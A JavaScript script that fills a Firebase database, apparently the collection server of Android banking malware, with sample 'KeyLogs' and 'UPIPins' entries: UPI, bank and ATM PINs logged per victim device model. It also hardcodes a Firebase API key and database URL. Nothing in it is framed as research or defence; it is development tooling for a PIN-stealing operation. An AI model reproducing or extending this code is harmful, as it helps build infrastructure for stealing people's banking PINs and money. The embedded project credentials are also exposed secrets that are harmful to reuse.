// Script to add test KeyLogs and UPI Pins data to Firebase
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Test data for KeyLogs
const testKeyLogs = {
  'Xiaomi 23076PC4BI': {
    'log1': {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:09:00",
      Column1: "1", Column2: "2", Column3: "3", 
      Column4: "4", Column5: "5", Column6: "6"
    },
    'log2': {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:08:00",
      Column1: "7", Column2: "8", Column3: "9", 
      Column4: "0", Column5: "1", Column6: "2"
    },
    'log3': {
      keylogger: "BANK_PIN",
      timestamp: "22-05-2025 02:07:00",
      Column1: "1", Column2: "2", Column3: "3", 
      Column4: "4", Column5: "", Column6: ""
    }
  },
  'Xiaomi M2103K19PI': {
    'log1': {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:06:00",
      Column1: "3", Column2: "4", Column3: "5",
      Column4: "6", Column5: "7", Column6: "8"
    },
    'log2': {
      keylogger: "ATM_PIN",
      timestamp: "22-05-2025 02:05:00",
      Column1: "9", Column2: "8", Column3: "7", 
      Column4: "6", Column5: "", Column6: ""
    }
  },
  'motorola moto g85 5G': {
    'log1': {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:04:00",
      Column1: "5", Column2: "4", Column3: "3", 
      Column4: "2", Column5: "1", Column6: "0"
    }
  },
  'samsung SM-A037F': {
    'log1': {
      keylogger: "BANK_PIN",
      timestamp: "22-05-2025 02:03:00",
      Column1: "1", Column2: "1", Column3: "1", 
      Column4: "1", Column5: "", Column6: ""
    }
  }
};

// Test data for UPI Pins
const testUPIPins = {
  'Xiaomi 23076PC4BI': ["123456", "789012", "345678"],
  'Xiaomi M2103K19PI': ["987654", "567890"],
  'motorola moto g85 5G': ["111111", "222222"],
  'samsung SM-A037F': ["000000", "999999"]
};

async function addTestData() {
  try {
    console.log('🚀 Adding test data to Firebase...');
    
    // Add KeyLogs data
    console.log('\n📱 Adding KeyLogs data...');
    for (const [deviceId, logs] of Object.entries(testKeyLogs)) {
      for (const [logId, logData] of Object.entries(logs)) {
        await set(ref(database, `KeyLogs/${deviceId}/${logId}`), logData);
        console.log(`✅ Added ${logId} for ${deviceId}`);
      }
    }
    
    // Add UPI Pins data
    console.log('\n💳 Adding UPI Pins data...');
    for (const [deviceId, pins] of Object.entries(testUPIPins)) {
      await set(ref(database, `UPIPins/${deviceId}`), pins);
      console.log(`✅ Added ${pins.length} UPI pins for ${deviceId}`);
    }
    
    console.log('\n🎉 Test data added successfully!');
    console.log('\n📊 Summary:');
    console.log(`- KeyLogs: ${Object.keys(testKeyLogs).length} devices`);
    console.log(`- UPI Pins: ${Object.keys(testUPIPins).length} devices`);
    
    // Force exit after completion
    process.exit(0);
    
  } catch (error) {
    console.error('❌ Error adding test data:', error);
    process.exit(1);
  }
}

// Run the function
addTestData();
